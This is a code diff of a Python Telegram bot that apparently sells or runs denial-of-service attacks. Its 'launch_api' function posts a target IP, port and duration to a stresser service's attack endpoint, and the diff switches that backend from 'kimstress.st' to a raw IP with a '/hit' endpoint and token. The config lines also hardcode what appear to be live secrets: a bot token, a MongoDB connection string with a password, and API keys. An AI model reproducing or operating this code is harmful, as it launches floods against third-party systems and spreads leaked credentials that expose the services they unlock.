@@ -18,8 +18,8 @@ load_dotenv()
 BOT_TOKEN        = os.getenv("BOT_TOKEN", "8796126950:AAF_WP7YytyW45Zk7IArqzsDW5b3wGvtSDk")
 MONGODB_URI      = os.getenv("MONGODB_URI", "mongodb+srv://rocky:rocky8688@cluster0.hzpkek4.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
 DATABASE_NAME    = os.getenv("DATABASE_NAME", "rockybot")
-API_URL          = os.getenv("API_URL", "https://kimstress.st")
-API_KEY          = os.getenv("API_KEY", "0dd36f49b2944c9568f4384cce7027443023e09312c6dc5da606a33f16bba5d0")
+API_URL          = os.getenv("API_URL", "http://34.126.208.96:8080")
+API_KEY          = os.getenv("API_KEY", "DRX_POWER_ULTRA_V4")
 ADMIN_IDS        = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "7340399575").split(",") if x.strip()]
 CHANNEL_ID       = os.getenv("CHANNEL_ID", "-1002558937048")
 CHANNEL_USERNAME = os.getenv("CHANNEL_USERNAME", "CODES")
@@ -356,19 +356,9 @@ def live_packet_sniffer(chat_id, user_id, message_id):
 
 def launch_api(ip, port, dur):
     try:
-        headers = {
-            "x-api-key": API_KEY,
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Accept": "application/json, text/plain, */*",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Origin": "https://kimstress.st",
-            "Referer": "https://kimstress.st/"
-        }
-        r = requests.post(
-            f"{API_URL}/api/v1/attack",
-            json={"ip": ip, "port": port, "duration": dur},
-            headers=headers,
+        r = requests.get(
+            f"{API_URL}/hit",
+            params={"token": API_KEY, "ip": ip, "port": port, "time": dur},
             timeout=300
         )
         logger.info(f"API Response [{r.status_code}]: {r.text[:300]}")
